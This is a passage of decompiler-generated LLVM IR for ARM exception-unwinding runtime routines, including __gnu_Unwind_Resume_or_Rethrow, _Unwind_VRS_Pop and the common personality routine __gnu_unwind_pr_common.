  store i32 %v6_18aac, i32* @r5, align 4
  store i32 %v9_18aac, i32* @r6, align 4
  store i32 %v12_18aac, i32* @lr, align 4
  ret i32 9

dec_label_pc_18b4c:                               ; preds = %dec_label_pc_18b08
  %v2_18b4c = ptrtoint i32* %stack_var_-248 to i32
  store i32 %v2_18b4c, i32* @r0, align 4
  %v1_18b50 = call i32 @__gnu_Unwind_Restore_VFP(i32 %v2_18b4c)
  %v0_18b34.pre = load i32, i32* %r4.global-to-local, align 4
  %phitmp = icmp eq i32 %v0_18b34.pre, 6
  br label %dec_label_pc_18b34

dec_label_pc_18b58:                               ; preds = %dec_label_pc_18b34
  %v0_18b58 = load i32, i32* @r5, align 4
  %v0_18b5c = load i32, i32* @r6, align 4
  call void @unwind_phase2(i32 %v0_18b58, i32 %v0_18b5c)
  ret i32 ptrtoint (i32* @0 to i32)

; uselistorder directives
  uselistorder i32 (i32, i32)* @get_eit_entry, { 3, 2, 0, 1 }
  uselistorder i32 %entry_vrs, { 0, 2, 1 }
  uselistorder label %dec_label_pc_18b3c, { 1, 0 }
  uselistorder label %dec_label_pc_18b34, { 1, 0 }
}

define i32 @__gnu_Unwind_Resume_or_Rethrow(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %v1_18b64 = add i32 %ucbp, 12
  %v2_18b64 = inttoptr i32 %v1_18b64 to i32*
  %v3_18b64 = load i32, i32* %v2_18b64, align 4
  %v2_18b68 = icmp eq i32 %v3_18b64, 0
  br i1 %v2_18b68, label %dec_label_pc_18b70, label %dec_label_pc_18b74

dec_label_pc_18b70:                               ; preds = %entry
  %v2_18b70 = call i32 @__gnu_Unwind_RaiseException(i32 0, i32 %entry_vrs)
  br label %dec_label_pc_18b74

dec_label_pc_18b74:                               ; preds = %entry, %dec_label_pc_18b70
  %v1_18b74 = add i32 %entry_vrs, 60
  %v2_18b74 = inttoptr i32 %v1_18b74 to i32*
  %v3_18b74 = load i32, i32* %v2_18b74, align 4
  %v2_18b7c = add i32 %entry_vrs, 64
  %v3_18b7c = inttoptr i32 %v2_18b7c to i32*
  store i32 %v3_18b74, i32* %v3_18b7c, align 4
  %v3_18b80 = call i32 @unwind_phase2_forced(i32 0, i32 %entry_vrs, i32 0)
  ret i32 %v3_18b80

; uselistorder directives
  uselistorder i32 (i32, i32, i32)* @unwind_phase2_forced, { 1, 0, 2 }
  uselistorder i32 %entry_vrs, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_18b74, { 1, 0 }
}

define i32 @_Unwind_VRS_Pop(i32 %context, i32 %regclass, i32 %discriminator, i32 %representation) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %regclass, 5
  br i1 %tmp, label %bb, label %dec_label_pc_18be0

bb:                                               ; preds = %entry
  %v7_18b98 = mul i32 %regclass, 4
  %v8_18b98 = add i32 %v7_18b98, ptrtoint (i32* @global_var_18ba0.712 to i32)
  call void @__pseudo_branch(i32 %v8_18b98)
  br label %dec_label_pc_18be0

dec_label_pc_18be0:                               ; preds = %bb, %entry
  ret i32 2

; uselistorder directives
  uselistorder i32 %regclass, { 1, 0 }
}

define i32 @__gnu_unwind_pr_common(i32 %state, i32 %ucbp, i32 %context, i32 %id) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %context, i32* %r2.global-to-local, align 4
  store i32 %state, i32* %r0.global-to-local, align 4
  %forced_unwind_-44 = alloca i32, align 4
  %uws_-60 = alloca %anon_struct_4, align 8
  %stack_var_-48 = alloca i32, align 4
  %v3_18cc8 = load i32, i32* @r4, align 4
  %v6_18cc8 = load i32, i32* @r5, align 4
  %v2_18cd8 = icmp eq i32 %id, 0
  store i32 %ucbp, i32* @r8, align 4
  %v1_18ce0 = add i32 %ucbp, 76
  %v2_18ce0 = inttoptr i32 %v1_18ce0 to i32*
  %v3_18ce0 = load i32, i32* %v2_18ce0, align 4
  %v1_18cec = inttoptr i32 %v3_18ce0 to i32*
  %v2_18cec = load i32, i32* %v1_18cec, align 4
  store i32 %v2_18cec, i32* @lr, align 4
  %v4_18cec = add i32 %v3_18ce0, 4
  store i32 %context, i32* %fp.global-to-local, align 4
  %v1_18cf8 = urem i32 %state, 4
  store i32 %v1_18cf8, i32* %r2.global-to-local, align 4
  %v1_18cfc = and i32 %state, 8
  store i32 %v1_18cfc, i32* %r0.global-to-local, align 4
  %v4_18d0c = getelementptr inbounds %anon_struct_4, %anon_struct_4* %uws_-60, i32 0, i32 0
  store i32 %v2_18cec, i32* %v4_18d0c, align 8
  br i1 %v2_18cd8, label %dec_label_pc_18d1c, label %dec_label_pc_18ff8

dec_label_pc_18d1c:                               ; preds = %entry
  %v3_18d1c = mul i32 %v2_18cec, 256
  store i32 %v3_18d1c, i32* %v4_18d0c, align 8
  store i32 3, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18d34

dec_label_pc_18d34:                               ; preds = %dec_label_pc_18ff8, %dec_label_pc_18d1c
  %v0_18d58647090 = phi i32 [ %v2_19010, %dec_label_pc_18ff8 ], [ %v4_18cec, %dec_label_pc_18d1c ]
  store i32 %v1_18cf8, i32* %r2.global-to-local, align 4
  %v1_18d38 = add i32 %ucbp, 80
  %v2_18d38 = inttoptr i32 %v1_18d38 to i32*
  %v3_18d38 = load i32, i32* %v2_18d38, align 4
  %v7_18d3c = icmp eq i32 %v1_18cf8, 2
  br i1 %v7_18d3c, label %bb, label %bb148

bb:                                               ; preds = %dec_label_pc_18d34
  %v2_18d40 = add i32 %ucbp, 56
  %v3_18d40 = inttoptr i32 %v2_18d40 to i32*
  %v4_18d40 = load i32, i32* %v3_18d40, align 4
  br label %bb148

bb148:                                            ; preds = %dec_label_pc_18d34, %bb
  %v0_18d586470 = phi i32 [ %v0_18d58647090, %dec_label_pc_18d34 ], [ %v4_18d40, %bb ]
  %v1_18d44 = urem i32 %v3_18d38, 2
  %v2_18d44 = icmp eq i32 %v1_18d44, 0
  br i1 %v2_18d44, label %dec_label_pc_18d58.preheader, label %bb149

bb149:                                            ; preds = %bb148
  br label %dec_label_pc_18e18

dec_label_pc_18d58.preheader:                     ; preds = %bb148
  %v1_18d586571 = inttoptr i32 %v0_18d586470 to i32*
  %v2_18d586672 = load i32, i32* %v1_18d586571, align 4
  %v2_18d5c6874 = icmp eq i32 %v2_18d586672, 0
  br i1 %v2_18d5c6874, label %dec_label_pc_18e18, label %dec_label_pc_18d64.preheader.lr.ph.lr.ph

dec_label_pc_18d64.preheader.lr.ph.lr.ph:         ; preds = %dec_label_pc_18d58.preheader
  %v7_18d68 = icmp eq i32 %id, 2
  %v2_18df4 = icmp eq i32 %v1_18cf8, 0
  %v2_18fc0 = ptrtoint i32* %forced_unwind_-44 to i32
  %v3_18edc = icmp eq i32 %v1_18cfc, 0
  br label %dec_label_pc_18d64.preheader.lr.ph

dec_label_pc_18d64.preheader.lr.ph:               ; preds = %dec_label_pc_18d64.preheader.lr.ph.lr.ph, %dec_label_pc_1902c
  %v1_18d7496 = phi i32 [ %v2_18d586672, %dec_label_pc_18d64.preheader.lr.ph.lr.ph ], [ %v2_18d5866, %dec_label_pc_1902c ]
  %v1_18d7093 = phi i32 [ %v0_18d586470, %dec_label_pc_18d64.preheader.lr.ph.lr.ph ], [ %v2_19030, %dec_label_pc_1902c ]
  %stack_var_-76.2.ph3175 = phi i32 [ 0, %dec_label_pc_18d64.preheader.lr.ph.lr.ph ], [ %stack_var_-76.4, %dec_label_pc_1902c ]
  br label %dec_label_pc_18d64.preheader

dec_label_pc_18d64.preheader:                     ; preds = %dec_label_pc_18d64.preheader.lr.ph, %dec_label_pc_18ff0
  %v1_18d7495 = phi i32 [ %v1_18d7496, %dec_label_pc_18d64.preheader.lr.ph ], [ %v2_18d58, %dec_label_pc_18ff0 ]
  %v1_18d7092 = phi i32 [ %v1_18d7093, %dec_label_pc_18d64.preheader.lr.ph ], [ %v1_18ff0, %dec_label_pc_18ff0 ]
  br label %dec_label_pc_18d64

dec_label_pc_18d64:                               ; preds = %dec_label_pc_18d64.preheader, %dec_label_pc_18e08
  %v1_18d74 = phi i32 [ %v1_18d7495, %dec_label_pc_18d64.preheader ], [ %v2_18e0c, %dec_label_pc_18e08 ]
  %v1_18d88 = phi i32 [ %v1_18d7092, %dec_label_pc_18d64.preheader ], [ %v1_18e08, %dec_label_pc_18e08 ]
  store i32 %id, i32* %r2.global-to-local, align 4
  br i1 %v7_18d68, label %bb151, label %.thread16

bb151:                                            ; preds = %dec_label_pc_18d64
  %v2_18d6c = add i32 %v1_18d88, 4
  %v3_18d6c = inttoptr i32 %v2_18d6c to i32*
  %v4_18d6c = load i32, i32* %v3_18d6c, align 4
  store i32 %v4_18d6c, i32* @r5, align 4
  store i32 %v1_18d74, i32* @r6, align 4
  %v0_18d78109 = load i32, i32* @r8, align 4
  %v1_18d78110 = add i32 %v0_18d78109, 72
  %v2_18d78111 = inttoptr i32 %v1_18d78110 to i32*
  %v3_18d78112 = load i32, i32* %v2_18d78111, align 4
  store i32 %v3_18d78112, i32* @lr, align 4
  %v2_18d84 = add i32 %v1_18d88, 8
  br label %bb152

.thread16:                                        ; preds = %dec_label_pc_18d64
  %v2_18d70 = add i32 %v1_18d88, 2
  %v3_18d70 = inttoptr i32 %v2_18d70 to i16*
  %v4_18d70 = load i16, i16* %v3_18d70, align 2
  %v5_18d70 = zext i16 %v4_18d70 to i32
  store i32 %v5_18d70, i32* @r5, align 4
  %v0_18d78 = load i32, i32* @r8, align 4
  %v1_18d78 = add i32 %v0_18d78, 72
  %v2_18d78 = inttoptr i32 %v1_18d78 to i32*
  %v3_18d78 = load i32, i32* %v2_18d78, align 4
  store i32 %v3_18d78, i32* @lr, align 4
  %v2_18d80 = inttoptr i32 %v1_18d88 to i16*
  %v3_18d80 = load i16, i16* %v2_18d80, align 2
  %v4_18d80 = zext i16 %v3_18d80 to i32
  store i32 %v4_18d80, i32* @r6, align 4
  %v2_18d88 = add i32 %v1_18d88, 4
  br label %bb152

bb152:                                            ; preds = %bb151, %.thread16
  %storemerge121 = phi i32 [ %v2_18d88, %.thread16 ], [ %v2_18d84, %bb151 ]
  %v3_18d78115 = phi i32 [ %v3_18d78, %.thread16 ], [ %v3_18d78112, %bb151 ]
  %v0_18d90113 = phi i32 [ %v5_18d70, %.thread16 ], [ %v4_18d6c, %bb151 ]
  store i32 %storemerge121, i32* @r7, align 4
  %v1_18d90 = and i32 %v0_18d90113, -2
  %v2_18d94 = add i32 %v1_18d90, %v3_18d78115
  store i32 %v2_18d94, i32* @r4, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_18da4 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18da4, i32* %r0.global-to-local, align 4
  %v5_18db0 = call i32 @_Unwind_VRS_Get(i32 %v0_18da4, i32 15, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_18db0, i32* %r0.global-to-local, align 4
  %v3_18db4 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_18db4, i32* %r2.global-to-local, align 4
  %v0_18db8 = load i32, i32* @r4, align 4
  %tmp = icmp ugt i32 %v0_18db8, %v3_18db4
  br i1 %tmp, label %._crit_edge, label %dec_label_pc_18dc4

._crit_edge:                                      ; preds = %bb152
  %v0_18ddc.pre = load i32, i32* @r6, align 4
  br label %bb154

dec_label_pc_18dc4:                               ; preds = %bb152
  %v0_18dc4 = load i32, i32* @r6, align 4
  %v1_18dc4 = and i32 %v0_18dc4, -2
  %v2_18dc8 = add i32 %v1_18dc4, %v0_18db8
  %v3_18dcc = icmp ult i32 %v3_18db4, %v2_18dc8
  br i1 %v3_18dcc, label %.thread20, label %bb153

bb153:                                            ; preds = %dec_label_pc_18dc4
  br label %bb154

.thread20:                                        ; preds = %dec_label_pc_18dc4
  br label %bb154

bb154:                                            ; preds = %bb153, %._crit_edge, %.thread20
  %v0_18ddc = phi i32 [ %v0_18ddc.pre, %._crit_edge ], [ %v0_18dc4, %bb153 ], [ %v0_18dc4, %.thread20 ]
  %v0_18f84 = phi i32 [ 0, %._crit_edge ], [ 0, %bb153 ], [ 1, %.thread20 ]
  %v0_18dd8 = load i32, i32* @r5, align 4
  %v1_18ddc = urem i32 %v0_18ddc, 2
  %v1_18dd8 = mul i32 %v0_18dd8, 2
  %v3_18de0 = and i32 %v1_18dd8, 2
  %v4_18de0 = or i32 %v3_18de0, %v1_18ddc
  store i32 %v4_18de0, i32* %r2.global-to-local, align 4
  %v7_18de4 = icmp eq i32 %v4_18de0, 1
  br i1 %v7_18de4, label %dec_label_pc_18f78, label %dec_label_pc_18dec

dec_label_pc_18dec:                               ; preds = %bb154
  %v2_18de4 = icmp eq i32 %v4_18de0, 0
  br i1 %v2_18de4, label %dec_label_pc_18df0, label %dec_label_pc_18ea0

dec_label_pc_18df0:                               ; preds = %dec_label_pc_18dec
  store i32 %v1_18cf8, i32* %r2.global-to-local, align 4
  br i1 %v2_18df4, label %.thread, label %bb155

.thread:                                          ; preds = %dec_label_pc_18df0
  %v0_18e08119 = load i32, i32* @r7, align 4
  br label %dec_label_pc_18e08

bb155:                                            ; preds = %dec_label_pc_18df0
  %v2_18e00 = icmp eq i32 %v0_18f84, 0
  %v0_18e08 = load i32, i32* @r7, align 4
  br i1 %v2_18e00, label %dec_label_pc_18e08, label %dec_label_pc_19180

dec_label_pc_18e08:                               ; preds = %.thread, %bb155
  %v0_18e08120 = phi i32 [ %v0_18e08119, %.thread ], [ %v0_18e08, %bb155 ]
  %v1_18e08 = add i32 %v0_18e08120, 4
  %v1_18e0c = inttoptr i32 %v1_18e08 to i32*
  %v2_18e0c = load i32, i32* %v1_18e0c, align 4
  %v2_18e10 = icmp eq i32 %v2_18e0c, 0
  br i1 %v2_18e10, label %dec_label_pc_18e18, label %dec_label_pc_18d64

dec_label_pc_18e18:                               ; preds = %dec_label_pc_1902c, %dec_label_pc_18ff0, %dec_label_pc_18e08, %dec_label_pc_18d58.preheader, %bb149
  %stack_var_-76.3 = phi i32 [ 0, %bb149 ], [ 0, %dec_label_pc_18d58.preheader ], [ %stack_var_-76.2.ph3175, %dec_label_pc_18e08 ], [ %stack_var_-76.2.ph3175, %dec_label_pc_18ff0 ], [ %stack_var_-76.4, %dec_label_pc_1902c ]
  %v0_18e18 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18e18, i32* %r0.global-to-local, align 4
  %tmp156 = bitcast %anon_struct_4* %uws_-60 to %anon_struct_13*
  %v4_18e20 = call i32 @__gnu_unwind_execute(i32 %v0_18e18, %anon_struct_13* %tmp156)
  store i32 %v4_18e20, i32* %r0.global-to-local, align 4
  store i32 %v4_18e20, i32* %r5.global-to-local, align 4
  %v2_18e24 = icmp eq i32 %v4_18e20, 0
  br i1 %v2_18e24, label %dec_label_pc_18e2c, label %dec_label_pc_18ea8

dec_label_pc_18e2c:                               ; preds = %dec_label_pc_18e18
  store i32 %stack_var_-76.3, i32* %r2.global-to-local, align 4
  %v2_18e30 = icmp eq i32 %stack_var_-76.3, 0
  br i1 %v2_18e30, label %bb157, label %dec_label_pc_18e3c

bb157:                                            ; preds = %dec_label_pc_18e2c
  store i32 8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18eac

dec_label_pc_18e3c:                               ; preds = %dec_label_pc_18e2c
  %v2_18e3c = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_18e3c, i32* %r4.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_18e4c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18e4c, i32* %r0.global-to-local, align 4
  %tmp158 = bitcast i32* %stack_var_-48 to i8*
  %v7_18e54 = call i32 @_Unwind_VRS_Get(i32 %v0_18e4c, i32 0, i32 15, i32 0, i8* %tmp158)
  %v0_18e58 = load i32, i32* %r5.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 %v0_18e4c, i32* %r0.global-to-local, align 4
  %v5_18e6c = call i32 @_Unwind_VRS_Set(i32 %v0_18e4c, i32 %v0_18e58, i32 14, i32 %v0_18e58, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_18e6c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32* %r2.global-to-local, align 4
  %v4_18e78 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 32) to i32*), align 4
  %v0_18e7c = load i32, i32* %r5.global-to-local, align 4
  %v0_18e80 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18e80, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 %v4_18e78, i32* %stack_var_-48, align 4
  %v5_18e94 = call i32 @_Unwind_VRS_Set(i32 %v0_18e80, i32 %v0_18e7c, i32 15, i32 %v0_18e7c, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18eac

dec_label_pc_18ea0:                               ; preds = %dec_label_pc_18dec
  %v7_18ea0 = icmp eq i32 %v4_18de0, 2
  br i1 %v7_18ea0, label %dec_label_pc_18eb8, label %dec_label_pc_18ea8

dec_label_pc_18ea8:                               ; preds = %dec_label_pc_18ea0, %dec_label_pc_18f8c, %dec_label_pc_18e18, %dec_label_pc_19180
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18eac

dec_label_pc_18eac:                               ; preds = %bb157, %dec_label_pc_191b8, %dec_label_pc_19148, %bb166, %dec_label_pc_18e3c, %dec_label_pc_18ea8
  %v1_18eb4 = phi i32 [ 8, %bb157 ], [ 7, %dec_label_pc_191b8 ], [ %v1_18eb4.pre, %dec_label_pc_19148 ], [ 7, %bb166 ], [ 7, %dec_label_pc_18e3c ], [ 9, %dec_label_pc_18ea8 ]
  store i32 %v3_18cc8, i32* %r4.global-to-local, align 4
  store i32 %v6_18cc8, i32* %r5.global-to-local, align 4
  ret i32 %v1_18eb4

dec_label_pc_18eb8:                               ; preds = %dec_label_pc_18ea0
  store i32 %v1_18cf8, i32* %r2.global-to-local, align 4
  %v0_18ebc = load i32, i32* @r7, align 4
  %v1_18ebc = inttoptr i32 %v0_18ebc to i32*
  %v2_18ebc = load i32, i32* %v1_18ebc, align 4
  %tmp206 = bitcast i32 %v2_18ebc to float
  %tmp207 = call float @fabsf(float %tmp206)
  %v1_18ec4 = bitcast float %tmp207 to i32
  store i32 %v1_18ec4, i32* @sl, align 4
  br i1 %v2_18df4, label %dec_label_pc_18ecc, label %dec_label_pc_19038

dec_label_pc_18ecc:                               ; preds = %dec_label_pc_18eb8
  %v2_18ecc = icmp eq i32 %v0_18f84, 0
  br i1 %v2_18ecc, label %dec_label_pc_19020, label %dec_label_pc_18ed4

dec_label_pc_18ed4:                               ; preds = %dec_label_pc_18ecc
  %v2_18ed8 = icmp eq i32 %v1_18ec4, 0
  br i1 %v2_18ed8, label %dec_label_pc_18ee4.thread, label %bb159

dec_label_pc_18ee4.thread:                        ; preds = %dec_label_pc_18ed4
  br label %dec_label_pc_19148

bb159:                                            ; preds = %dec_label_pc_18ed4
  br i1 %v3_18edc, label %dec_label_pc_18eec, label %dec_label_pc_19020

dec_label_pc_18eec:                               ; preds = %bb159
  %v1_18eec = add i32 %v0_18ebc, 4
  store i32 %v1_18eec, i32* @r6, align 4
  store i32 100, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v0_18efc = load i32, i32* @r8, align 4
  %v1_18efc = add i32 %v0_18efc, 88
  store i32 %v1_18efc, i32* %sb.global-to-local, align 4
  store i32 %v1_18eec, i32* @r4, align 4
  br label %dec_label_pc_18f20

dec_label_pc_18f10:                               ; preds = %bb161
  %v1_18f10 = add i32 %v0_18f10, 1
  store i32 %v1_18f10, i32* @r5, align 4
  %v1_18f14 = load i32, i32* @sl, align 4
  %v9_18f14 = icmp eq i32 %v1_18f10, %v1_18f14
  %v0_18f18 = load i32, i32* @r4, align 4
  %v1_18f18 = add i32 %v0_18f18, 4
  store i32 %v1_18f18, i32* @r4, align 4
  br i1 %v9_18f14, label %dec_label_pc_19148, label %dec_label_pc_18f10.dec_label_pc_18f20_crit_edge

dec_label_pc_18f10.dec_label_pc_18f20_crit_edge:  ; preds = %dec_label_pc_18f10
  %v0_18f2c.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_18f20

dec_label_pc_18f20:                               ; preds = %dec_label_pc_18f10.dec_label_pc_18f20_crit_edge, %dec_label_pc_18eec
  %v0_18f2c = phi i32 [ %v0_18f2c.pre, %dec_label_pc_18f10.dec_label_pc_18f20_crit_edge ], [ %v1_18efc, %dec_label_pc_18eec ]
  %v1_18f30 = phi i32 [ %v1_18f18, %dec_label_pc_18f10.dec_label_pc_18f20_crit_edge ], [ %v1_18eec, %dec_label_pc_18eec ]
  %v1_18f20 = inttoptr i32 %v1_18f30 to i32*
  %v2_18f20 = load i32, i32* %v1_18f20, align 4
  %v2_18f24 = icmp eq i32 %v2_18f20, 0
  store i32 %v0_18f2c, i32* %forced_unwind_-44, align 4
  br i1 %v2_18f24, label %bb161, label %bb160

bb160:                                            ; preds = %dec_label_pc_18f20
  br label %bb161

bb161:                                            ; preds = %dec_label_pc_18f20, %bb160
  %v0_18f34 = load i32, i32* @r8, align 4
  store i32 %v0_18f34, i32* %r0.global-to-local, align 4
  store i32 %v2_18fc0, i32* %r2.global-to-local, align 4
  %v4_18f44 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 100) to i32*), align 4
  store i32 102224, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_18f44)
  %v0_18f50 = load i32, i32* %r0.global-to-local, align 4
  %v2_18f50 = icmp eq i32 %v0_18f50, 0
  %v0_18f10 = load i32, i32* @r5, align 4
  br i1 %v2_18f50, label %dec_label_pc_18f10, label %dec_label_pc_18f58

dec_label_pc_18f58:                               ; preds = %bb161
  %v1_18f58 = load i32, i32* @sl, align 4
  %v9_18f58 = icmp eq i32 %v0_18f10, %v1_18f58
  br i1 %v9_18f58, label %dec_label_pc_19148, label %dec_label_pc_18f60

dec_label_pc_18f60:                               ; preds = %dec_label_pc_18f58
  %v0_18f60 = load i32, i32* @r7, align 4
  %v1_18f60 = inttoptr i32 %v0_18f60 to i32*
  %v2_18f60 = load i32, i32* %v1_18f60, align 4
  %v1_18f64 = icmp slt i32 %v2_18f60, 0
  %v0_18f6c.pre = load i32, i32* @r6, align 4
  br i1 %v1_18f64, label %dec_label_pc_18f6c, label %dec_label_pc_1902c

dec_label_pc_18f6c:                               ; preds = %dec_label_pc_18f60, %dec_label_pc_19024
  %v0_18f6c = phi i32 [ %storemerge, %dec_label_pc_19024 ], [ %v0_18f6c.pre, %dec_label_pc_18f60 ]
  store i32 %v0_18f6c, i32* %r0.global-to-local, align 4
  %v1_18f70 = add i32 %v0_18f6c, 4
  store i32 %v1_18f70, i32* @r6, align 4
  br label %dec_label_pc_1902c

dec_label_pc_18f78:                               ; preds = %bb154
  store i32 %v1_18cf8, i32* %r2.global-to-local, align 4
  br i1 %v2_18df4, label %dec_label_pc_18f84, label %dec_label_pc_19070

dec_label_pc_18f84:                               ; preds = %dec_label_pc_18f78
  %v2_18f84 = icmp eq i32 %v0_18f84, 0
  br i1 %v2_18f84, label %dec_label_pc_18ff0, label %dec_label_pc_18f8c

dec_label_pc_18f8c:                               ; preds = %dec_label_pc_18f84
  %v0_18f8c = load i32, i32* @r7, align 4
  %v1_18f8c = add i32 %v0_18f8c, 4
  %v2_18f8c = inttoptr i32 %v1_18f8c to i32*
  %v3_18f8c = load i32, i32* %v2_18f8c, align 4
  %v7_18f90 = icmp eq i32 %v3_18f8c, -2
  store i32 %v1_18f8c, i32* %r2.global-to-local, align 4
  br i1 %v7_18f90, label %dec_label_pc_18ea8, label %dec_label_pc_18f9c

dec_label_pc_18f9c:                               ; preds = %dec_label_pc_18f8c
  %v0_18f9c = load i32, i32* @r8, align 4
  %v1_18f9c = add i32 %v0_18f9c, 88
  %v7_18fa0 = icmp eq i32 %v3_18f8c, -1
  store i32 %v1_18f9c, i32* %forced_unwind_-44, align 4
  br i1 %v7_18fa0, label %dec_label_pc_18fe4, label %dec_label_pc_18fac

dec_label_pc_18fac:                               ; preds = %dec_label_pc_18f9c
  %v2_18fb0 = icmp eq i32 %v3_18f8c, 0
  br i1 %v2_18fb0, label %bb163, label %bb162

bb162:                                            ; preds = %dec_label_pc_18fac
  br label %bb163

bb163:                                            ; preds = %dec_label_pc_18fac, %bb162
  store i32 %v0_18f9c, i32* %r0.global-to-local, align 4
  store i32 %v2_18fc0, i32* %r2.global-to-local, align 4
  %v4_18fcc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 100) to i32*), align 4
  store i32 102360, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_18fcc)
  %v0_18fd8 = load i32, i32* %r0.global-to-local, align 4
  %v2_18fd8 = icmp eq i32 %v0_18fd8, 0
  br i1 %v2_18fd8, label %bb164, label %.thread25

.thread25:                                        ; preds = %bb163
  %v3_18fe4.pr = load i32, i32* %forced_unwind_-44, align 4
  br label %dec_label_pc_18fe4

bb164:                                            ; preds = %bb163
  store i32 0, i32* %forced_unwind_-44, align 4
  br label %dec_label_pc_18ff0

dec_label_pc_18fe4:                               ; preds = %.thread25, %dec_label_pc_18f9c
  %v3_18fe4 = phi i32 [ %v3_18fe4.pr, %.thread25 ], [ %v1_18f9c, %dec_label_pc_18f9c ]
  %v2_18fe8 = icmp eq i32 %v3_18fe4, 0
  br i1 %v2_18fe8, label %dec_label_pc_18ff0, label %dec_label_pc_19148

dec_label_pc_18ff0:                               ; preds = %bb164, %dec_label_pc_1909c, %dec_label_pc_19070, %dec_label_pc_18fe4, %dec_label_pc_18f84
  %v0_18ff0 = load i32, i32* @r7, align 4
  %v1_18ff0 = add i32 %v0_18ff0, 8
  %v1_18d58 = inttoptr i32 %v1_18ff0 to i32*
  %v2_18d58 = load i32, i32* %v1_18d58, align 4
  %v2_18d5c = icmp eq i32 %v2_18d58, 0
  br i1 %v2_18d5c, label %dec_label_pc_18e18, label %dec_label_pc_18d64.preheader

dec_label_pc_18ff8:                               ; preds = %entry
  %v3_18ff8 = udiv i32 %v2_18cec, 65536
  store i32 2, i32* %r2.global-to-local, align 4
  %v6_19008 = mul nuw nsw i32 %v3_18ff8, 4
  %v3_1900c = mul i32 %v2_18cec, 65536
  %v2_19010 = add i32 %v6_19008, %v4_18cec
  store i32 %v3_1900c, i32* %v4_18d0c, align 8
  br label %dec_label_pc_18d34

dec_label_pc_19020:                               ; preds = %bb159, %dec_label_pc_18ecc
  %v1_19020 = add i32 %v0_18ebc, 4
  br label %dec_label_pc_19024

dec_label_pc_19024:                               ; preds = %dec_label_pc_19064, %dec_label_pc_19020
  %v0_19024 = phi i32 [ %v2_19064, %dec_label_pc_19064 ], [ %v2_18ebc, %dec_label_pc_19020 ]
  %storemerge = phi i32 [ %v4_19064, %dec_label_pc_19064 ], [ %v1_19020, %dec_label_pc_19020 ]
  store i32 %storemerge, i32* @r6, align 4
  %v1_19024 = icmp slt i32 %v0_19024, 0
  br i1 %v1_19024, label %dec_label_pc_18f6c, label %dec_label_pc_1902c

dec_label_pc_1902c:                               ; preds = %dec_label_pc_18f60, %dec_label_pc_19024, %dec_label_pc_19138, %dec_label_pc_18f6c
  %v0_19030 = phi i32 [ %v1_18f70, %dec_label_pc_18f6c ], [ %storemerge, %dec_label_pc_19024 ], [ %v1_1913c, %dec_label_pc_19138 ], [ %v0_18f6c.pre, %dec_label_pc_18f60 ]
  %stack_var_-76.4 = phi i32 [ %stack_var_-76.2.ph3175, %dec_label_pc_18f6c ], [ %stack_var_-76.2.ph3175, %dec_label_pc_19024 ], [ %v1_19138, %dec_label_pc_19138 ], [ %stack_var_-76.2.ph3175, %dec_label_pc_18f60 ]
  %v0_1902c = load i32, i32* @sl, align 4
  %v3_1902c = mul i32 %v0_1902c, 4
  %v2_19030 = add i32 %v3_1902c, %v0_19030
  %v1_18d5865 = inttoptr i32 %v2_19030 to i32*
  %v2_18d5866 = load i32, i32* %v1_18d5865, align 4
  %v2_18d5c68 = icmp eq i32 %v2_18d5866, 0
  br i1 %v2_18d5c68, label %dec_label_pc_18e18, label %dec_label_pc_18d64.preheader.lr.ph

dec_label_pc_19038:                               ; preds = %dec_label_pc_18eb8
  %v0_19048 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_19048, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_19050 = load i32, i32* @r8, align 4
  %v1_19050 = add i32 %v0_19050, 32
  %v2_19050 = inttoptr i32 %v1_19050 to i32*
  %v3_19050 = load i32, i32* %v2_19050, align 4
  store i32 %v3_19050, i32* @r4, align 4
  %v5_19054 = call i32 @_Unwind_VRS_Get(i32 %v0_19048, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_19054, i32* %r0.global-to-local, align 4
  %v3_19058 = load i32, i32* %stack_var_-48, align 4
  %v0_1905c = load i32, i32* @r4, align 4
  %v9_1905c = icmp eq i32 %v0_1905c, %v3_19058
  br i1 %v9_1905c, label %dec_label_pc_19104, label %dec_label_pc_19038.dec_label_pc_19064_crit_edge

dec_label_pc_19038.dec_label_pc_19064_crit_edge:  ; preds = %dec_label_pc_19038
  %v0_19064.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_19064

